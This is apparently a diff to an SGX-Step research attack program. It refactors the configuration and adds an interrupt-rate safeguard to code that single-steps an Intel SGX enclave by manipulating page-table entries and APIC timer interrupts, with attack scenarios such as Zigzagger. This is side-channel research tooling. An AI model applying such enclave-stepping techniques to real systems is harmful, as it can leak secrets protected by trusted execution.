@@ -27,29 +27,10 @@
 #include "libsgxstep/sched.h"
 #include "libsgxstep/enclave.h"
 #include "libsgxstep/debug.h"
+#include "libsgxstep/config.h"
 
-#define VICTIM_CPU                  1
-#define PSTATE_PCT                  100
 #ifndef NUM_RUNS
     #define NUM_RUNS                100
-#endif
-
-/*
- * XXX Configure APIC timer interval for next interrupt.
- *
- * NOTE: the exact timer interval value depends on CPU frequency, and hence
- *       remains inherently platform-specific. We empirically established
- *       suitable timer intervals on both our evaluation platforms by
- *       tweaking and observing the NOP microbenchmark erip results.
- */
-#define DELL_INSPIRON_7359          1
-#define DELL_OPTIPLEX_7040          2
-#if (SGX_STEP_PLATFORM == DELL_INSPIRON_7359)
-    #define SGX_STEP_TIMER_INTERVAL 28
-#elif (SGX_STEP_PLATFORM == DELL_OPTIPLEX_7040)
-    #define SGX_STEP_TIMER_INTERVAL 19
-#else
-    #error Unsupported SGX_STEP_PLATFORM; configure timer interval manually...
 #endif
 
 #define MICROBENCH                  1
@@ -61,8 +42,7 @@
 
 sgx_enclave_id_t eid = 0;
 int strlen_nb_access = 0;
-int irq_cnt = 0;
-int fault_cnt = 0;
+int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
 uint64_t *pte_encl = NULL;
 uint64_t *pmd_encl = NULL;
 
@@ -91,6 +71,13 @@ void aep_cb_func(uintptr_t erip)
         *pte_encl = MARK_NOT_ACCESSED( *pte_encl );
     #endif
 
+    if (do_irq && (irq_cnt > NUM_RUNS*500))
+    {
+        info("excessive interrupt rate detected (try adjusting timer interval " \
+             "to avoid getting stuck in zero-stepping); aborting...");
+	do_irq = 0;
+    }
+
     /*
      * Configure APIC timer interval for next interrupt.
      *
@@ -100,8 +87,11 @@ void aep_cb_func(uintptr_t erip)
      * enclave instruction.
      * 
      */
-    *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
-    apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
+    if (do_irq)
+    {
+        *pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
+        apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
+    }
 }
 
 /* Called upon SIGSEGV caused by untrusted page tables. */
@@ -145,13 +135,15 @@ void attacker_config_page_table(void)
         void *str_adrs;
         SGX_ASSERT( get_str_adrs( eid, &str_adrs) );
         info("enclave str adrs at %p\n", str_adrs);
-        print_page_table( str_adrs );
+        //print_page_table( str_adrs );
         pte_encl = remap_page_table_level( str_adrs, PTE);
     #endif
 
-    print_page_table( get_enclave_base() );
+    //print_page_table( get_enclave_base() );
     pmd_encl = remap_page_table_level( get_enclave_base(), PMD);
-    *pmd_encl = MARK_EXECUTE_DISABLE(*pmd_encl);
+    #if SINGLE_STEP_ENABLE
+        *pmd_encl = MARK_EXECUTE_DISABLE(*pmd_encl);
+    #endif
 }
 
 /* Hook local APIC timer in /dev/sgx-step driver and setup one-shot mode. */
@@ -173,11 +165,11 @@ void attacker_restore_apic(void)
 /* Untrusted main function to create/enter the trusted enclave. */
 int main( int argc, char **argv )
 {
-	sgx_launch_token_t token = {0};
-	int apic_fd, encl_strlen = 0, updated = 0;
+    sgx_launch_token_t token = {0};
+    int apic_fd, encl_strlen = 0, updated = 0;
 
-   	info("Creating enclave...");
-	SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
+    info("Creating enclave...");
+    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                     &token, &updated, &eid, NULL ) );
 
     /* 1. Setup attack execution environment. */
@@ -186,7 +178,8 @@ int main( int argc, char **argv )
     attacker_config_apic();
 
     /* 2. Single-step enclaved execution. */
-    info("calling enclave: attack=%d; num_runs=%d", ATTACK_SCENARIO, NUM_RUNS);
+    info("calling enclave: attack=%d; num_runs=%d; timer=%d",
+        ATTACK_SCENARIO, NUM_RUNS, SGX_STEP_TIMER_INTERVAL);
 
     #if (ATTACK_SCENARIO == ZIGZAGGER)
         SGX_ASSERT( do_zigzagger(eid, NUM_RUNS) );
@@ -200,7 +193,7 @@ int main( int argc, char **argv )
 
     /* 3. Restore normal execution environment. */
     attacker_restore_apic();
-   	SGX_ASSERT( sgx_destroy_enclave( eid ) );
+    SGX_ASSERT( sgx_destroy_enclave( eid ) );
 
     info("all done; counted %d IRQs", irq_cnt);
     return 0;
